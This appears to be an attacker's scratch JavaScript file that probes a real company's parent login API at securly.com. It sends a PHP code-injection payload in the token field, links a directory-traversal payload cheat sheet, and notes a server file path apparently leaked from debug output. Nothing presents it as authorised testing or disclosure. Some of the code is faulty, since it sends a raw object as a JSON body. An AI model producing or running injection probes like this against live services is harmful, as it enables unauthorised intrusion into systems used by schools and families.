

//$.ajax({
//    url:"https://securly.com/parents/api/requestLogin",
//    data:{token:"g",password:"adcd"}
//}).done(function(html) {
//    console.log(html);
//})
//https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#unc-bypass
///var/www_shared/library/Securly/SSO.php:62:string '' (length=0)
const e = fetch("https://securly.com/parents/api/requestLogin", {
    method: "POST",
    body: {token:'<?php echo "pwned"?>',password:"adcd"},
    headers: {
        "Content-Type": "application/json"
    }
}).then(async (res) => {
    console.log(res);
    // Unpack the body Stream
   // const body = await res.text();
   // console.log(body);

});
